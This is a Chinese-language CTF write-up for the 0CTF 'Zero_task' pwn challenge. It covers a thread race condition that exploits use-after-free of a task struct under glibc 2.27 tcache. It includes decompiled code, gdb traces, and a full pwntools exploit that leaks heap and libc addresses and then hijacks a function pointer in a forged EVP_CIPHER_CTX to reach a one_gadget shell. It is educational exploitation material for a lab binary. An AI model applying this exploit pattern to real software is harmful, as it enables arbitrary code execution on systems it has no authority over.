# Zero_task

0ctf的题都好难，一题都打不动，大佬们tql，（这题还是最简单的，orz

漏洞为条件竞争,libc版本为2.27，存在tcache,go的时候线程sleep了2秒,我们可以提前释放一个task2结构，然后在task1 go的时候，把task1删除，然后task1的data成员会被覆盖成task2的地址,然后只要task1的data_sz足够大，就能把task2的内容全部都加密输出，后面用一次go的机会解密输出就能泄露地址。要注意的是删除task1的时候，task1的EVP_CIPHER_CTX 对象（对象大小为0xb0）会被破化，这样会导致加密异常，所以要想办法克服这个问题。
参考大佬的方法：

free(1)
free(2)
free(3)
ad(0xa0)
ad(0x8)

这样最后一个ad(0x8)会把task1的EVP_CIPHER_CTX 对象重写，task1就能正常输出了。

我分析的结构如下：

```c
task            struc ; (sizeof=0x80, mappedto_6)
00000000 data            dq ?
00000008 data_sz         dq ?
00000010 enc_dec_flag    dd ?
00000014 key             db 32 dup(?)
00000034 IV              db 16 dup(?)
00000044 field_44        dq ?
0000004C field_4C        dq ?
00000054 field_54        dd ?
00000058 EVP_CTX_new_PTR dq ?
00000060 task_id         dq ?
00000068 next            dq ?
00000070 field_70        dd ?
00000074 field_74        dq ?
0000007C field_7C        dd ?
00000080 task            ends
```

```c
void __fastcall __noreturn start_routine(task *a1)
{
  int v1; // [rsp+14h] [rbp-2Ch]
  task *v2[2]; // [rsp+18h] [rbp-28h]
  __int64 v3; // [rsp+28h] [rbp-18h]
  __int64 v4; // [rsp+30h] [rbp-10h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  *(_OWORD *)v2 = (unsigned __int64)a1;
  v1 = 0;
  v3 = 0LL;
  v4 = 0LL;
  puts("Prepare...");
  sleep(2u);		//!!
  memset(qword_202030, 0, 0x1010uLL);
  if ( !(unsigned int)EVP_CipherUpdate(
                        v2[0]->EVP_CTX_new_PTR,
                        qword_202030,
                        &v1,
                        v2[0]->data,
                        (unsigned int)v2[0]->data_sz) )
    pthread_exit(0LL);
  v2[1] = (task *)((char *)v2[1] + v1);
  if ( !(unsigned int)EVP_CipherFinal_ex(v2[0]->EVP_CTX_new_PTR, (char *)qword_202030 + (unsigned __int64)v2[1], &v1) )
    pthread_exit(0LL);
  v2[1] = (task *)((char *)v2[1] + v1);
  puts("Ciphertext: ");
  show_ciphertext(stdout, (unsigned __int8 *)qword_202030, (unsigned __int64)v2[1], 0x10uLL, 1uLL);
  pthread_exit(0LL);
}
```
泄露了地址后，还剩一次go的机会，跟进EVP_CipherUpdate函数，该函数会根据EVP_CIPHER_CTX 对象+0x10数据判断加密还是解密，加密流程里会有一处相对调用

```c
 0x55f605048c10                           jmp    qword ptr [rip + 0x201342] <0x7ff7b8383d90>
    ↓
   0x7ff7b8383d90 <EVP_CipherUpdate>        mov    eax, dword ptr [rdi + 0x10]  
   0x7ff7b8383d93 <EVP_CipherUpdate+3>      test   eax, eax
 ► 0x7ff7b8383d95 <EVP_CipherUpdate+5>    ✔ jne    EVP_CipherUpdate+16 <0x7ff7b8383da0>
    ↓
   0x7ff7b8383da0 <EVP_CipherUpdate+16>     jmp    EVP_EncryptUpdate <0x7ff7b8383880>
    ↓
   0x7ff7b8383880 <EVP_EncryptUpdate>       push   r15
   0x7ff7b8383882 <EVP_EncryptUpdate+2>     push   r14
   0x7ff7b8383884 <EVP_EncryptUpdate+4>     push   r13
   0x7ff7b8383886 <EVP_EncryptUpdate+6>     push   r12
   0x7ff7b8383888 <EVP_EncryptUpdate+8>     mov    r13, rsi
   0x7ff7b838388b <EVP_EncryptUpdate+11>    push   rbp

```

```c
   0x7ff7b838389d <EVP_EncryptUpdate+29>     test   byte ptr [rax + 0x12], 0x10
 ► 0x7ff7b83838a1 <EVP_EncryptUpdate+33>   ✔ je     EVP_EncryptUpdate+104 <0x7ff7b83838e8>
    ↓
   0x7ff7b83838e8 <EVP_EncryptUpdate+104>    cmp    r8d, 0
   0x7ff7b83838ec <EVP_EncryptUpdate+108>    jle    EVP_EncryptUpdate+400 <0x7ff7b8383a10>
 
   0x7ff7b83838f2 <EVP_EncryptUpdate+114>    movsxd r14, dword ptr [rdi + 0x14]
   0x7ff7b83838f6 <EVP_EncryptUpdate+118>    test   r14d, r14d
   0x7ff7b83838f9 <EVP_EncryptUpdate+121>    je     EVP_EncryptUpdate+352 <0x7ff
   
   ................................................................................
  
   0x7ff7b83839ed <EVP_EncryptUpdate+365>    movsxd rcx, r8d
   0x7ff7b83839f0 <EVP_EncryptUpdate+368>    mov    dword ptr [rsp], r8d
   0x7ff7b83839f4 <EVP_EncryptUpdate+372>    mov    rdx, r12
 ► 0x7ff7b83839f7 <EVP_EncryptUpdate+375>    call   qword ptr [rax + 0x20]  


```
call   qword ptr [rax + 0x20] 这里的rax的值为EVP_CIPHER_CTX 对象的+00处的值，所以我们只要构造好假的对象，即可让程序跳转到one_gadget

exp如下:

```python
from pwn import *
import time
p = process("./task")
libc = ELF("./libc-2.27.so")
def add(id,flag,key,iv,sz,data):
	p.recvuntil("Choice: ")
	p.sendline("1")
	p.recvuntil("Task id :")
	p.sendline(str(id))
	p.recvuntil("Encrypt(1) / Decrypt(2): ")
	p.sendline(str(flag))
	p.recvuntil("Key :")
	p.send(key)
	p.recvuntil("IV :")
	p.send(iv)
	p.recvuntil('Data Size :')
	p.sendline(str(sz))
	p.recvuntil("Data")
	p.send(data)
def add_(id,flag,key,iv,sz,data):
	p.sendline("1")
	p.recvuntil("Task id :")
	p.sendline(str(id))
	p.recvuntil("Encrypt(1) / Decrypt(2): ")
	p.sendline(str(flag))
	p.recvuntil("Key :")
	p.send(key)
	p.recvuntil("IV :")
	p.send(iv)
	p.recvuntil('Data Size :')
	p.sendline(str(sz))
	p.recvuntil("Data")
	p.send(data)
def delete(id):
	p.recvuntil("Choice: ")
	p.sendline("2")
	p.recvuntil("Task id :")
	p.sendline(str(id))
def go(id):
	p.recvuntil("Choice: ")
	p.sendline("3")
	p.recvuntil("Task id :")
	p.sendline(str(id))
def main():
	gdb.attach(p)
	for i in range(0,4):
		add(i,1,'a'*0x20,'a'*0x10,0x100,'1'*0x100)
	
	add(20,1,'a'*0x20,'a'*0x10,0x250,'1'*0x250)
	add(21,1,'a'*0x20,'a'*0x10,8,'1'*8)
	add(22,1,'a'*0x20,'a'*0x10,8,'1'*8)
	add(23,1,'a'*0x20,'a'*0x10,8,'1'*8)
	add(24,1,'a'*0x20,'a'*0x10,8,'1'*8)
	
	for i in range(0,4):
		delete(str(i))
	
	go(20)
	delete(20)
	
	delete(21)
	delete(22)
	
	add(21,1,'a'*0x20,'a'*0x10,0xa0,'1'*0xa0)
	add(22,1,'a'*0x20,'a'*0x10,8,'1'*8)
	
	p.readuntil('Ciphertext: \n')
	
	data = ''.join((''.join(p.recv(0x745).split(' '))).split('\n'))
	
	#leak
	add_(233,2,'a'*0x20,'a'*0x10,len(data.decode('hex')),data.decode('hex'))
	
	go(233)
	p.readuntil('Ciphertext: \n')
	heap = u64((''.join(p.recv(24).split(' '))).decode('hex'))-0x1920
	for _ in range(36):
		p.recvuntil('\n')

	libc.address = u64((''.join(p.recv(24).split(' '))).decode('hex'))-0x3ebda0
	success('heap : ' + hex(heap))
	success('libc : ' + hex(libc.address))
	
	# 0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
	# constraints:
	# rcx == NULL

	# 0x4f322	execve("/bin/sh", rsp+0x40, environ)
	# constraints:
	# [rsp+0x40] == NULL

	# 0x10a38c	execve("/bin/sh", rsp+0x70, environ)
	# constraints:
	# [rsp+0x70] == NULL
	one_gadget = 0x10a38c+libc.address
	success('one_gadget : ' + hex(one_gadget))
	
	add_(234,1,'a'*0x20,'a'*0x10,8,'1'*8)
	
	go(234)
	delete(234)
	delete(23)
	add_(234,1,'a'*0x20,'a'*0x10,0xa0,p64(heap+0x19a0)+'1'*0x18+p64(one_gadget))
	
	p.interactive()
if __name__ == "__main__":
	main()
```
参考链接：
[https://www.anquanke.com/post/id/175401](https://www.anquanke.com/post/id/175401)
